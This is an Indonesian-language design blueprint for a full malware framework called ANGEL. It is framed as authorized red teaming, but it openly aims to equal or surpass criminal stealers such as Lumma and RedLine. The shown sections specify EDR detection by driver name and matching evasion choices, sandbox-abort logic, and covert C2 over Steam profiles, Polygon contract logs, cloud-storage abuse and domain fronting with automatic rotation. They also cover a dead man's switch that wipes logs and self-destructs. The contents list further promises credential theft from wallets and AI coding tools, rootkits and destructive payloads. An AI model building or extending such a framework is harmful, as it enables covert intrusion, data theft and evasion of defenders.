# STRUKTUR_ANGEL — BLUEPRINT v4.0 (FULL-ATTACK FRAMEWORK, LAYER 1–70)

> **Status:** REWRITE TOTAL — v3.2 (LAYER 1–70) dirombak total menjadi v4.0
> dengan format + kedalaman yang di-upgrade. Tetap satu file: `STRUKTUR_ANGEL.md`.
> **Tujuan:** Platform offensive security (red team) kelas profesional untuk engagement resmi berizin.
> **Standar:** Hard/Critical P0/P1, Full Attack, No Demo, No Placeholder, No Sederhana.
> **Barometer kualitas:** setiap modul minimal setara Cobalt Strike / Havoc / Brute Ratel / Nighthawk / Sliver / Aeternum C2, Kynx / Lumma / RedLine / Void Stealer, Ekko / Foliage / Cronos / DeathSleep, Hell's Gate / Halo's Gate / Tartarus Gate / FreshyCalls / SysWhispers3. Harus menyamai atau melampaui.
> **Prinsip:** "No copy-paste" — tiap teknik ditulis spesifik untuk ANGEL, bukan tempelan tool.
> **Legalitas:** Hanya untuk sistem yang telah diizinkan. Lihat Section 40.

---

## DAFTAR ISI

1. GAP ANALYSIS v3.2 → v4.0 (kenapa dirombak ulang)
2. ARSITEKTUR GLOBAL BARU
3. CORE ENGINES (dipakai SEMUA layer)
4. LAYER 1 — C2 Framework
5. LAYER 2 — Malleable Profile Engine + Decoy
6. LAYER 3 — SQL Injection Engine
7. LAYER 4 — NoSQL Injection Engine
8. LAYER 5 — Database Post-Exploitation
9. LAYER 6 — Evasion & Stealth (kernel-level)
10. LAYER 7 — Active Directory Attack
11. LAYER 8 — Lateral Movement
12. LAYER 9 — Persistence
13. LAYER 10 — Rootkit (UEFI/SMM/Firmware/Ring-0)
14. LAYER 11 — Credential Theft (stealer-grade)
15. LAYER 12 — Collector / InfoStealer
16. LAYER 13 — Destruction & Impact
17. LAYER 14 — Orchestration Engine
18. LAYER 15 — Brain (AI Logic / LangGraph Integration)
19. LAYER 16 — Infrastructure
20. LAYER 17 — OSINT
21. LAYER 18 — Exploitation (web-to-DB chain)
22. LAYER 19 — Forensic Evidence
23. LAYER 20 — Reporting
24. LAYER 21 — Cleanup & Anti-Forensics
25. LAYER 22 — Auth Bypass
26. LAYER 23 — Network Evasion
27. LAYER 24 — Full Scope Attack Simulation
28. LAYER 25 — Implant Generator
29. MODUL TAMBAHAN v2 (LAYER 26–40)
30. MODUL TAMBAHAN v3 (LAYER 41–60)
31. MODUL TAMBAHAN v3.1 (LAYER 61–70)
32. STATISTIK TOTAL
33. PRINSIP DASAR
34. CHECKLIST FINAL
35. TIMELINE PENGERJAAN
36. DOKUMENTASI CARA PAKAI
37. EDGE CASE MATRIX — 70 LAYERS
38. TEST SCENARIOS — 70 LAYERS
39. KESIMPULAN
40. LEGAL & SAFETY DISCLAIMER

Layer inti (Section 4–28) ditulis dengan 8 blok standar — Layer 1–25 wajib hukumnya:

```
B1 TEKNIK       — 5–7+ alternatif per modul (setara/lampaui framework referensi)
B2 FALLBACK     — state machine: A gagal → B → C → D (otomatis, <5 detik)
B3 ENV DETECT   — framework tahu EDR/sandbox/OS apa yang aktif
B4 ADAPTASI     — pilih teknik oleh environment (tabel keputusan)
B5 RESILIENCE   — 10 edge case standar (EDGE-01..EDGE-10) + respon spesifik layer
B6 TEST         — TC unik per layer (lingkungan, teknik, metrik, iterasi)
B7 CARA PAKAI   — operasional operator
B8 EXTRA TOOLS  — tambahan di luar spec request
```

Melanjutkan konvensi v3.2: nomor **LAYER** (1–70) di seluruh dokumen ini adalah
**nomor modul/kategori modul**, bukan tingkatan komponen. Layer 1–25 direstruktur
dengan format improved di Section 4–28; Layer 26–70 (modul tambahan) dipertahankan
utuh dari v3.2 di Section 29–31, lengkap dengan STATISTIK, EDGE CASE MATRIX, dan
TEST SCENARIOS seluruh 70 layer di Section 32–38.

---

## 1. GAP ANALYSIS v3.2 → V2

Pembanding: spec full-attack 25-layer yang diminta. Berikut gap yang ditutup di V2:

| # | Temuan gap besar di v3.2 | Perbaikan V2 |
|---|--------------------------|--------------|
| 01 | Layer C2: malleable cuma "profile YAML" — tidak ada TLS fingerprint engine (JA3/JA3S, HTTP/2 fingerprint, urutan header), tidak ada konfigurasi sleep infield | Profile engine nyata: transform blocks, fingerprint turunan client TLS asli (Section 5) |
| 02 | Steam C2 & blockchain C2 cuma satu baris | Mekanik penuh: rotasi display-name, storage slot kontrak, 3-RPC confirmation (Section 4.3, 4.4) |
| 03 | Legit service abuse (OneDrive/Dropbox/GDrive) tanpa auth flow | Token OAuth refresh, API endpoint per service, fallback ke anonymous share (Section 4.5) |
| 04 | Sleep masking (Ekko/Foliage/etc) cuma nama | 11 teknik dengan rantai API + pemetaan syscall + deteksi (Section 9.1) |
| 05 | AMSI/ETW cuma 1 teknik | 6 teknik: hardware BP, in-process patch, registry disable, session hijack, VEH, CLR hook (Section 9.3) |
| 06 | Unhooking tidak ada | 4 jalur: ntdll clean, kernel32 copy, KnownDlls, manual mapping (Section 9.4) |
| 07 | EDR detection tidak ada (EDR update case cuma cerita) | ENV_DETECT memproduksi profil EDR by nama (csagent→CS, sentinel→S1, ds_engine→Defender, etc.) + Tabel adaptasi per EDR (Section 3.2, 9.6) |
| 08 | Rantai cred stealer (MCE→DBS→ChromeElevator→RawCopy) cuma nama | Detail mekanik tiap tahap + Dirrer (Section 14.1) |
| 09 | DevGrabber ga ada path/skema | Path & schema config per tool: Claude Code, Cursor, Copilot, Windsurf, VS Code (Section 14.3) |
| 10 | Wallets/gaming/VPN cuma angka | Enumerator + lokasi penyimpanan konkret tiap keluarga (Section 14.5–14.9) |
| 11 | Orchestrator/LangGraph cuma nama | Definisi graph (node/edge), intent taxonomy, risk formula, learning loop (Section 17) |
| 12 | Exploitation terpisah dari DB layer | Web→DB chain glue eksplisit (Section 20 + 28) |
| 13 | Enforcement "5–7 alternatif + fallback + env detect + adaptasi + 10 edge case + test + docs" tidak konsisten | Satu template layer standar B1–B8 dipakai di semua layer |
| 14 | 1346 test TC dipisah dari modul | Test ditaruh per layer, berima dengan teknik; metrik & iterasi eksplisit |
| 15 | Tidak ada ledakan multi-layer kill chain | Section 28: glue graph antar layer + autopilot |

---

## 2. ARSITEKTUR GLOBAL BARU

### 2.1 Diagram komponen

```
 LEGEND: [x] = komponen nyata, (y) = data store, {z} = interface/ABI

┌──────────────────────────────────────────────────────────────────────────────┐
│              TIER 5: FRONTEND — CONTROL PLANE (Angular/React)                │
│  [Operator Console] [Mission Planner] [Graph Viewer (attack surface)]        │
│  [Chat-Agent Console] [Report Studio] [GeoMap / BeaconMap] [Telemetry]       │
└──────────▲───────────────────────────────────────────────────────────────────┘
           │ WebSocket (event bus subscriber) + REST
┌──────────┴───────────────────────────────────────────────────────────────────┐
│              TIER 4: API GATEWAY (Rust/Go)                                    │
│  [authN] [RBAC/casbin] [rate-limit (token bucket per operator)]              │
│  [request-validation] [audit ledgger hook] [SSE push]                        │
└──────────▲───────────────────────────────────────────────────────────────────┘
           │
┌──────────┴───────────────────────────────────────────────────────────────────┐
│              TIER 3: ORCHESTRATOR + BRAIN (LangGraph / event-driven Go)      │
│  [Intent Classifier] → [Risk Gate] → [Agent Dispatcher]                      │
│  [Autopilot Engine] [LangGraph supergraph] [MCP gateway] [Fireteam pool]     │
│  (STATE STORE: SQLite/PostgreSQL + Redis)  (TECH_LEDGER burned registry)     │
│  (EVIDENCE LEDGER: hash chain)  (BEHAVIOR DB: learning loop)                 │
└──────────┬───────────────────────────────────────────────────────────────────┘
           │ event bus v2 (Section 3.4) — goresan async, retry, replay
┌──────────▼───────────────────────────────────────────────────────────────────┐
│              TIER 2: C2 FRAMEWORK (Rust core, cross-compile)                 │
│  [Implant runtime (win/linux/mac/android)]  [Teamserver]                     │
│  [Listener pool: HTTPS/DNS/DoH/WS/SMB/TCP/ICMP/Telegram/Discord/Slack/       │
│  Twitter/Steam/Blockchain/OneDrive/GDrive/Dropbox]  [SMB Beacon mesh]        │
│  [Malleable profile engine]  [The Decoy]  [LOGISTICS: rotation/pivot]        │
│  (EVASION RUNTIME: sleep-mask, syscall gate, AMSI patch, unhook)             │
└──────────┬───────────────────────────────────────────────────────────────────┘
           │ implant uplink (multiplexed, per-channel crypto)
┌──────────▼───────────────────────────────────────────────────────────────────┐
│              TIER 1: INFRASTRUCTURE (Terraform/Ansible)                      │
│  [VPS farm: 4+ VPC fungsional] [redirector farm (nginx/HAProxy)]             │
│  [WireGuard mesh] [DNS server (authoritative, brass aufduty)]                │
│  [CDN front (Cloudflare/CloudFront/Azure CDN)] [steam/blockchain nodes]      │
└───────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 Level desain yang dilarang

- DILARANG modul dengan < 5 teknik alternatif.
- DILARANG teknik tanpa jalur fallback.
- DILARANG layer tanpa tabel ENV_DETECT + ADAPTASI.
- DILARANG test tanpa environment + metrik + iterasi.
- DILARANG placeholder / "sebagai contoh" / "TODO implement".

### 2.3 Pemetaan 25 layer → tier eksekusi

| Layer | Tier | Pemilik |
|-------|------|---------|
| L1 C2 | T2 | implant + teamserver |
| L2 Malleable/Decoy | T2 | profile engine + redirector |
| L3 SQLi, L4 NoSQL | T2/T3 | exploit engine |
| L5 DB Post-Exploit | T2/T3 | exploit engine |
| L6 Evasion | T2 | implant runtime |
| L7 AD | T2 | implant + lateral |
| L8 Lateral | T2 | implant |
| L9 Persistence | T2 | implant |
| L10 Rootkit | T2 (firmware/HW) |- |
| L11 Cred Theft, L12 Collector | T2 | implant |
| L13 Destruction | T2/T3 | implant + orchestrator |
| L14/15 Orchestrator+Brain | T3 | orchestrator |
| L16 Infra | T1 | infra |
| L17 OSINT | T1/T3 | orchestrator |
| L18 Exploitation | T2/T3 | exploit engine |
| L19 Evidence, L20 Reporting | T3/T4 | ledger + gateway |
| L21 Cleanup | T2/T3 | semua |
| L22 Auth Bypass | T3 | exploit engine |
| L23 Net Evasion | T2 | implant + infra |
| L24 Full Scope | T3 | orchestrator autopilot |
| L25 Implant Gen | T2 | build pipeline |

---

## 3. CORE ENGINES (dipakai SEMUA layer)

Empat engine global ini dieksekusi satu kali di bootstrap dan di-refresh periodik.
Semua modul layer WAJIB membaca state engine ini — tidak boleh ada layer yang
membuat logika fallback/deteksi sendiri tanpa mengikuti kontrak di bawah.

### 3.1 TECHNIQUE LEDGER (state burned/undetected)

```
ENTRY TECHNIQUE:
  id           "L6_SLEEP_EKKO"
  layer        6
  module       "sleep_mask"
  technique    "ekko"
  status       READY | PENDING | BURNED | DEGRADED
  last_run_ts  RFC3339
  failure      { code, reason, edr_sig_ver, ts }
  score        float (kepercayaan sukses 0..1)
  detect_feed  [ { edr:"crowdstrike", sig:"123.4.5", ts, evidence } ]

KONTRAK:
  - teknik yang status=BURNED TIDAK boleh dipilih oleh adapter mana pun.
  - score di-reset saat ENV_DETECT melihat EDR signature baru (lihat EDGE-01).
  - ledger persisted di STATE STORE, diduplikasi di infil (cache lokal implant
    biar tetap jalan walau operator offline).
```

### 3.2 ENV_DETECT — Environment Fingerprint Engine

Output: satu objek `env_profile` dengan lima kategori:

```
env_profile:
  os:        { family: windows|linux|darwin|android|ios|unknown
               version, build, arch, locale, hostname, domain_member,
               av_installed:[], last_uptime_days, smbv1, signing_forced }
  edr:       [ { vendor, product, version, sig_ver, driver_path,
                 hooks_present, etw_state, amsi_state, disk_freshness } ]
  sandbox:   { cuckoo, wine, firejail, bruteshield, anyrun, hybrid, capev2 }
  vm:        { vmware, vbox, qemu, hyperv, xen, kvm, cloud_imds_accessible }
  debugger:  { present, hw_bp_hit, ntglobalflag, trapflag, timing_drift_ms }

SENSOR (Windows contoh):
  S-01 GetVersionExW/RtlGetVersion            → family/version
  S-02 IsWow64Process + PROCESSOR_ARCHITECTURE→ arch
  S-03 Loaded-module scan (EnumProcessModules + file metadata):
       csagent.sys / csdevicecontrol.sys     → CROWDSTRIKE
       sentinelmonitor.sys / sentinel.sys     → SENTINELONE
       ds_engine.sys / wdavboot.sys / mpengine→ MS DEFENDER
       carbonblackk.sys / paragent.sys        → CB/Autonomous Agent
       secore.sys / rtcore64.sys              → InterceptX/XDR Palo
       sysmon.sys / edrsensor.sys             → Sysmon
       bdselfpr.sys / bdcore.sys              → Bitdefender
       msgina/avp  → Kaspersky; ufdfwcomp → Eset; dwprot → Webroot
  S-04 RtlGetVersion + build → Windows 11 24H2 dst (untuk SSN/offset select)
  S-05 Hook scan: baca 16B prologue NtCreateFile/NtProtectVirtualMemory
       → E9/E8 5-byte JMP = hooked (Halo detect) → categori tiap gate
  S-06 ETW provider status (NtQueryInformationProcess / provider enumeration)
  S-07 AMSI: load amsi.dll → cek AmsiScanBuffer state (patched/unpatched)
  S-08 Cores/RAM/Disk/Uptime/Mouse/ProcCount (anti-sandbox vector)
  S-09 CPUID hypervisor bit + SMBIOS vendor + MAC prefix + driver list (VM)
  S-10 Debugger triples: PEB.BeingDebugged, NtGlobalFlag, DR0-7, RDTSC drift
  S-11 Windows Defender auth chain: MpCmdRun / MsMpEng presence + status service
  S-12 Proxy/egress test (untuk pilih channel C2 + domain fronting)

CONTOH OUTPUT EDR PRECISION (kunci adaptasi):
  pai_edr = [
    {"vendor":"CrowdStrike","ver":"6.45","sig":"2025.09.14.CW",
     "hooks":["ntdll:NtCreateFile","ntdll:NtProtectVirtualMemory","ntdll:NtWriteVirtualMemory"],
     "sleep_detect":"etw+thread","syscall_detect":"indirect+stack"],
    {"vendor":"Microsoft","ver":"4.18","sig":"1.401.1902.0",
     "hooks":["ntdll:NtCreateProcessEx","ntdll:NtMapViewOfSection"],
     "sleep_detect":"etw","syscall_detect":"indirect"],
  ]

KONSUMEN:
  - Layer 6  → pilih teknik sleep/syscall/AMSI berdasarkan pai_edr
  - Layer 1  → pilih channel + profile TLS
  - Layer 8  → pilih protokol lateral (SMB vs WinRM vs DCOM by port)
  - Layer 9  → pilih persistence set berdasarkan OS + EDR (sideload vs task)
  - Layer 14 → risk scorer ngambil confidence dari env_profile
  - Layer 25 → implant generator gagal-ap-by-EVE constraints dari env_profile
```

Refresh cadence: statis (boot) → tiap 5 menit realtime (hooked EDR detect,
memetakan sig_ver drifting), plus paksa refresh saat EDGE-01 (EDR update) terpicu.

### 3.3 FALLBACK_ENGINE

```
FALLBACK STATE MACHINE (generik, dipakai semua teknik semua layer):

┌────────┐  FAIL/IDLE ┌─────────┐  FAIL ┌─────────┐  FAIL ┌─────────┐
│ ENERGY │───────────►│ FALLBACK │──────►│ FALLBACK │──────►│ ESCALATE │
│  A     │            │   B      │       │   C      │       │  D..H    │
└────────┘            └─────────┘        └─────────┘        └─────────┘
   │ SUCCESS              │ SUCCESS           │ SUCCESS        │
   ▼                      ▼                  ▼                ▼
┌───────────────────────────────────────────────────────────────────┐
│                      COMMIT → report result                        │
└───────────────────────────────────────────────────────────────────┘

DECISION LOGIC (failReason ∈ {DETECTED, BLOCKED, TIMEOUT, NODATA, CRASH}):
  DETECTED → TECH_LEDGER.mark(technique,"BURNED"); pilih dari undetected pool
  BLOCKED  → switch channel/endpoint family; jangan retry endpoint sama
  TIMEOUT  → retry backoff 1s→2s→4s→8s (max 3); lalu teknik berikutnya
  NODATA   → likely wrong signature/env → re-detect environment (3.2)
  CRASH    → isolate + self-heal (rebuffer proses, rollback memory)

KENYAMANAN:
  - setiap layer mendefinisikan ORDER-nya sendiri (DEFAULT fallback chain)
  - engine memakai TECH_LEDGER untuk skip BURNED
  - state tranding ke event bus (ops.fallback.transitioned.v1)
```

### 3.4 EVENT BUS v2

```
TOPIC  <domain>.<module>.<action>.<ver>
DOMAIN c2|orchestrator|exploit|evasion|cred|destroy|infra|ops|report|gateway

ENVELOPE:
  { id, topic, ts, src, dst, type:event|command|result|sync,
    priority, trace_id, data, attach:{path,sha256} }

GARANSI:
  - at-least-once, retry 3x backoff, FIFO per (topic,publisher)
  - replay dari STATE STORE pasca-recovery
  - HMAC header X-Angel-Sign (HMAC-SHA256, session key ECDH)
  - payload besar via attachment reference (bukan inline)

RESULT → EVIDENCE LEDGER otomatis (Section 21).
```

### 3.5 RESILIENCE — 10 Edge Case Standar (EDGE-01..EDGE-10)

Seluruh layer membawa tabel B5 ringkas; definisi kondisi + respons generik:

```
EDGE-01 EDR update di tengah engagement
        Trigger: Sig fingerprint berubah / Nt* prologue baru kena hook /
                 implant mulai di-log saat checkin.
        Generik: 1.ENV_DETECT force refresh  2.TECH_LEDGER reset score utk teknik
                 yang kena sig baru  3.action="" pilih teknik undetected
                 4.rebuild biner (L25)  5.re-deploy via channel cadangan
                6.taruh "canary" (payload dummy) utk konfirmasi deteksi baru

EDGE-02 C2 channel ke-block
        Trigger: 3x health-check gagal.
        Generik: 1.log "channel blocked"  2.rotasi ke FALLBACK_CHAIN L1
                3.update DNS/CDN  4.aktifkan domain fronting  5.tunnel proto lain

EDGE-03 Implant ke-detect & ke-quarantine
        Trigger: heartbeat hilang / bilboard unlock tidak dibalas.
        Generik: 1.deploy backup implant (biner baru, persistensi baru)
                2.re-harvest cred yang hilang  3.re-routing C2  4.trace cleanup

EDGE-04 Persistence kehapus
        Trigger: watchdog (30s) gagal find persistence.
        Generik: 1.re-persist via backup mechanism L9  2.log + alert operator

EDGE-05 Credential ke-rotate
        Trigger: access denied berulang pada cred yang dipakai.
        Generik: 1.re-harvest (L11)  2.update cred store  3.re-auth upstream

EDGE-06 Network segment berubah
        Trigger: ARP/route table deltect / pivot pintu mati.
        Generik: 1.re-scan topologi  2.re-route  3.update pivot tables

EDGE-07 Operator kehilangan koneksi
        Trigger: heartbeat operator > timeout.
        Generik: 1.implant → mode autonomous  2.kerjakan task prioritas tinggi
                3.queue task rendah  4.pelihara heartbeat (jitter acak)
                5.resume sinkronisasi state saat reconnect

EDGE-08 Dead man's switch
        Trigger: tidak ada heartbeat operator dalam X (config).
        Generik: 1.wipe cred  2.hapus persistensi  3.bersihkan log/artefak
                4.self-destruct biner  5.zero-fill memory  6.torpedo decoy

EDGE-09 Self-destruct
        Konfirmasi operator / kondisi EDGE-08.
        Generik: wipe → hapus → log cleanup → binary destroy → zero memory
                 (urutan bisa dibalik untuk menghasilkan bait decoy)

EDGE-10 Memory forensics | traffic analysis | reboot/BSOD
        Trigger: memory timing anomaly, network pattern anomaly, reboot.
        Generik: 1.relokasi/enkripsi memori  2.rotate kunci + morph traffic
                3.periksa persistence pre-reboot  4.auto-restart pasca boot
```

### 3.6 ADAPTATION — Decision Table (contoh generik)

```
env_profile.edr[0].vendor == CrowdStrike
  → sleep:EKKO (no ETW trace), syscall:DIRECT, amsi:PATCH_ETW_REG
env_profile.edr[0].vendor == SentinelOne
  → sleep:CRONOS (APC), syscall:INDIRECT, amsi:VEH_PATCH
env_profile.edr[0].vendor == Defender + sandbox flags true
  → delay attack, morph profile, gunakan channel non-HTTP
env_profile.sandbox.cuckoo
  → abort payload, exit clean (score=0), tunggu user interaction
```

## 4. LAYER 1 — C2 FRAMEWORK

### 4.0 Struktur Codebase

```
c2/
├── implant/            # runtime build (win/linux/darwin/android)
│   ├── core/           # task loop, crypto, sleep, fallback, dms
│   ├── evasion/        # L6 runtime (sleep-mask, gate, amsi, unhook)
│   ├── transport/      # per-channel adapter
│   ├── steal/          # L11/L12 runtime
│   └── persist/        # L9 runtime
├── teamserver/
│   ├── listener/       # 1 file per protokol
│   ├── task/           # queue, scheduler, result
│   ├── crypto/         # ecdh, aes-gcm, hmac, cert, tls-fp
│   └── api/            # gateway hook
├── malleable/          # L2 profile engine
├── rotation/           # channel state machine
├── beacon/             # jitter/sleep/kill-date/working-hours
└── logs/               # telemetry feeder ke evidence ledger
```

### 4.1 Modul BEACON (kontrol waktu)

Teknik (7):
1. **SLEEP_FIXED** — durasi tetap; sederhana, terdeteksi pola.
2. **SLEEP_JITTER** — durasi = base ± N% (acak); default 20%. Kurangi prediktabilitas.
3. **SLEEP_GUASSIAN** — jitter berdistribusi gaussian (mean=base, sigma=cfg) → pola waktu antara beacon tampak organik.
4. **SLEEP_KILLDATE** — implan berhenti check-in setelah kill date; gunakan pola "detach-and-hold" (tidak ada activity).
5. **SLEEP_WORKHOURS** — hanya check-in dalam jam kerja target (config tz local); malam hari tidur panjang, siang berdenyut.
6. **SLEEP_TIMEJITTER** — durasi + ofset acak 0-30s; putus pola beacon-to-beacon.
7. **SLEEP_RANDOM_FEED** — durasi di-seed dari entropy lingkungan (uptime, process ticks, WMI battery) supaya pola tidak nol-nol.

Fallback: SLEEP_FIXED → SLEEP_JITTER → SLEEP_GUASSIAN → SLEEP_TIMEJITTER → SLEEP_RANDOM_FEED → (jika EDR pattern-detect) SLEEP_WORKHOURS + SLEEP_KILLDATE hold.

ENV: `env_profile` menentukan base sleep: sandbox suspicion tinggi → sleep baseline besar. ADAPTASI: pemilihan teknik sleep dilakukan saat check-in #3 (setelah env profile siap).

Resilience (ringkas): EDGE-02 → naikkan frekuensi check-in di channel tersisa; EDGE-07 → autonogomous queue; EDGE-08 → halt beacon, masuk DMS.

Test:
```
L1-B-01 Varian sinyal-soal/jitter  | SLEEP set = ±20% jitter  | iterasi 1k ticks
L1-B-02 kill date                    | check-in berhenti sesuai T | manual test 1x
L1-B-03 working hours (UTC diff)     | tak ada beacon malam local | 48h soak test
L1-B-04 prediktabilitas beacon       | entropy test: tidak ada interval berulang | 3k sample
```

### 4.2 Modul PROFILE_TLS — TLS Fingerprint Engine

Teknik (7) untuk memalsukan sidik jari klien:
1. **JA3_SYNTH** — susun ClientHello dengan susunan cipher, extens extracted dari capture Chrome/Edge/Firefox asli. Tidak cukup JA3 string ─ bangun byte-stream asli: Version=TLS1.2, cipher list urut vendor, extension order as-is.
2. **JA3S_SERVER** — fingerprint sisi server (server_hello) dikontrol agar cocok dengan "typical" CDN; hasilnya identik dengan arah route yang sah.
3. **HTTP2_FP** — SESUK/H2: urutan SETTINGS frame, window update size, priority, header order, pseudo-header order — diambil dari profil nyata (Chrome H2 fingerprint ≠ Firefox H2 fingerprint).
4. **HEADER_ORDER** — urutan header HTTP persis seperti klien asli (Chrome: sec-ch-ua sebelum accept-type). Pengaturan di profil malleable per dest profile (Teams/Office/Google).
5. **TLS_EXT_ORDER** — urutan extension (extended_master_secret, renegotiation_info, ALPN, supported_groups, ec_point_formats, session_ticket, SNI) sesuai versi klien.
6. **ALPN_SET** — pilihan "h2,http/1.1" atau "http/1.1" saja; sinkron dengan HTTP2_FP.
7. **UADIV_FP** — kombinasi User-Agent + Accept + Accept-Encoding + Priority yang konsisten satu produk (tidak mencampur sinyal).

Fallback: JA3_SYNTH → JA3S_SERVER → HTTP2_FP (bila ALPN riil memicu H2). Jika server WAF membandingkan fingerprint, lampaui dengan MENGHAPUS quirk yang menandai (mis. TLSFingerprint checker deteksi patch order tidak wajar).

ENV: egress proxy / TLS-terminating WAF terdeteksi sensor S-12 → pilih profil yang cocok dengan host header. ADAPTASI: per-destination profile (lihat L2).

Test:
```
L1-T-01 fingerprinter eksternal (tls-fingerprint, ja3 offline) vs sintesis
        → mismatch < 1 atribut
L1-T-02 H2 SETTINGS: validasi oleh curl -I/--http2 → tidak markup aneh
L1-T-03 urutan header: replay diff len+order == charm
L1-T-04 inkonsistensi silang: UA Chrome + cipher Firefox → flaged
L1-T-05 regresi setelah update Chrome (refet profile baru) → iterasi ulang
```

### 4.3 Modul CHANNEL — Transport & Rotasi

Daftar 18+ protokol, tiap satu teknik operasi + deteksi + fallback (ringkas):

| ID   | Protokol | Operasi | Deteksi gagal | Fallback |
|------|----------|---------|---------------|----------|
| CH-1 | HTTPS    | POST /api/v1/telemetry, body AES-GCM | 3x HTTP!=2xx/TCP reset | CH-2 |
| CH-2 | DNS      | TXT/MX query, base32 subdomain | TXT kosong berulang | CH-3 |
| CH-3 | DoH      | HTTP POST ke cloudflare-dns/google-dns | respon malformed | CH-4 |
| CH-4 | WebSocket| WSS channel, binary frames | handshake fail | CH-5 |
| CH-5 | SMB      | named pipe \pipe\msagent_<rand> (internal) | pipe unavailable | CH-8 |
| CH-6 | TCP Raw  | custom framing, XOR/AES per packet | handshake reset | CH-1 |
| CH-7 | ICMP     | echo req/reply payload | no reply 3x | CH-2 |
| CH-8 | Telegram | bot api methods (sendMessage/getUpdates) | api.telegram.org block | CH-9 |
| CH-9 | Discord  | webhook post / embed | 401/403 webhook | CH-10 |
| CH-10| Slack    | incoming webhook slash | 403 | CH-11 |
| CH-11| Twitter/X| DM + profile field stego | rate-limit | CH-12 |
| CH-12| Steam    | (detail 4.3.1) | API limit / no new name | CH-13 |
| CH-13| Blockchain (Polygon) | (detail 4.3.2) | RPC gasp / nonce conflict | CH-14 |
| CH-14| OneDrive | (detail 4.3.3) | auth revoked | CH-15 |
| CH-15| Google Drive | (detail 4.3.3) | auth revoked | CH-16 |
| CH-16| Dropbox  | (detail 4.3.3) | auth revoked | CH-1 |
| CH-17| Domain Fronting | CDN SNI + Host asal (detail 4.3.4) | TLS probe block | CH-18 |
| CH-18| Legit paste | Pastebin/Gist/Notion/Trello polling | throttle | CH-7 |

FALLBACK CHAIN DEFAUL (akurasi cepat, <5s):
```
CH-1 HTTPS → CH-2 DNS → CH-3 DoH → CH-4 WS → CH-12 Steam → CH-13 Blockchain
→ CH-14 OneDrive → CH-15 GDrive → CH-16 Dropbox → CH-8 Telegram → CH-17 Fronting
→ ALL_BURNED → alert operator → implant standby (ditunggu instruksi offline)
```

ROTATION MANAGER (kunci):
```
- health check tiap beacons; 3x gagal → mark BURNED di TECH_LEDGER (L3.1)
- rotasi global: jika >50% channel FAIL dalam 10 menit → OPSEC flip
  (ganti seluruh network metadata: domain, bot token, wallet, profile)
- jitter check-in per channel agar sinkron-naik tidak terdeteksi
- hasil rotasi di-emit ke bus: c2.rotation.shifted.v1
```

#### 4.3.1 CH-12 Steam C2 (mekanik)

```
INFRA:
  - akun steam utama (listener) + spekual "canary" throwaway
  - profile nyata, 200+ games, avatar random, full info

KOMANDO (request → implant):
  field "displayname" dipakai sebagai carrier per-chunk (base32, chunk 30 char):
    chunk = "<nonce2>:<cmd_id>:<seq>:+<len>:<data>"
  implant membaca displayname dari friend list / profile via ISteamUser API
  (GetPlayerSummaries) pada interval beacon.

STATUS (response → operator):
  field "summary" / "status" / "about_me" di-update oleh operator bot:
    "<cmd_id>:<status_code>:<payload_len>"
  payload besar → steam "artwork showcase" / screenshots (stego LSB) 
  arah balik; link ke attach server.

ROTASI INFRA (SEMANGAT REQUEST):
  mode_A  ganti display name tiap N command → sukar correlate
  mode_B  ganti akun tiap M jam (kumpulan akun pool)
  mode_C  jadwal "game status" perubahan = sinyal kill/switch channel

DETEKSI: spike traffic ke api.steampowered.com + polter display name aneh.
ADAPTASI: kalau Steam rate-limit (429), imigrasi CH-12 ke CH-13.
```

#### 4.3.2 CH-13 Blockchain C2 (Polygon, mekanik)

```
SMART CONTRACT (listener sisi operator):
  - deploy ERC-1155/ERC-20 "innocent" token 'ANGELTOK' di Polygon
  - komando broadcast ditaruh di event log (Transfer/LogIndex), bukan fungsi
    stateful agar network & explorer tampak normal.
  - isi: byte array terenkripsi AES-256-GCM {cmd_id, nonce, payload}
  - keystream tiap command deterministik dari (chain_id, block, logIndex)
    → anti-replay index.

KONFIRMASI 3 RPC (kunci):
  operator tidak menerima command sebelum >=3 dari {Infura, Alchemy,
  QuickNode, Pokt, publicnodes} menyetujui event yang sama dalam 2 blok.
  → mitiguasi RPC fork / node lie (detail: majority vote).
  Respon implant di-submit sebagai transaction dari address implant
  → opcode di calldata (0x02 ping-pong), gas economics low.

ROTASI: tiap campaign deploy kontrak baru, burner key, bridge fees kecil.
DETEKSI C2 NETWORK: traffic blockchain unusual → pakai "batch scan" low-gas
  dan inkognito golem (tidak langsung dari node publik pribadi).

ADAPTASI: kalau nonce conflict (dua tx implant bersamaan) → queue nonce
  penetration; kalau gas mahal → PCI via "safe" relay.
```

#### 4.3.3 CH-14/15/16 Legit Service Abuse

```
MESSAGE PAD (netral): folder per-implant, file blob chunk (mis. "report_<date>.xlsx"),
  isi encrypted + dummy francais agar tidak mencolok.
KOMDO via: 
  - OneDrive: shared link + delta API (judul folder = marker ping) 
  - GDrive: shared drive + comment sebagai "MHO"
  - Dropbox: app token + /2/files/list_folder
AUTH: refresh token OAuth (3600s), auto-revoke mitigation → simpan device
  fingerprint untuk re-auth flow.
FALLBACK: layanan kehapus akses → pindah ke service lain (CH-15→16→1).
EKSTRA: abuse versioning sebagai replay-resistant store (hanya append).
```

#### 4.3.4 CH-17 Domain Fronting

```
TEKNIK (5):
 F1 Cloudflare → SNI: legit-front-domain, Host: target-c2-domain
 F2 CloudFront → ditto (fronting path /legit/, backdoor ke dist)
 F3 Azure CDN → ditto
 F4 Fastly/KeyCDN → ditto
 F5 Redirector CDN: fronting + URI-based routing anti-probe
DETEKSI: egress TLS probe / SNI check → ganti fronting domain.
ADAPTASI: pilih CDN dari env (region target, latency, egress policy).
```

### 4.4 Modul COMMS_CRYPTO

```
- Key exchange: ECDH P-256 → HKDF → AES-256-GCM per-channel + session nonce acak
- Token autentikasi implant: HMAC over nonce+ts (5 menit kualitas)
- Anti-replay: mencegah key reuse di channel baru (channel-bound keys)
- Kill-switch token: command khusus "sepuku" + HMAC valid = self-destruct (L14)
- Post-quantum flag: opsional Kyber-768 hybrid (ini memenuhi "lampaui" ref)
```

### 4.5 Dokumentasi Cara Pakai (L1)

```
make listen                        # teamserver start semua listener default
implant-gen --os windows --l1 httpregex-env   # bangun implant (L25)
team-listener --rotate CH-7       # paksa rotasi manual ke protokol ICMP
team-beacon --set jitter 0.30 --set killdate 2026-01-01 --set workhours 8-18
team-chan --status                # lihat matrix channel + health
```

### 4.6 Extra Tools tambahan (L1)

- **PLAYLIST_TRIGGER** — Streaming-profile "music" list sebagai C2 signal.
